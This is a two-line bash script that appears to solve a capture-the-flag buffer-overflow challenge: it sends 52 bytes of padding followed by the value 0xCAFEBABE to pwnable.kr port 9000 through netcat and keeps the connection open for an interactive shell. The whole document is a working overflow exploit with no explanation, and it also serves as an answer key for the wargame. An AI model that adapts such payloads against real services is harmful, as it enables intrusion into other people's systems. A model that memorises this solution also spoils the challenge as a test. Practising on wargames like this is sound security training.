#!/bin/bash

(python -c "print '.'*52 + '\xBE\xBA\xFE\xCA'"; cat) | nc pwnable.kr 9000
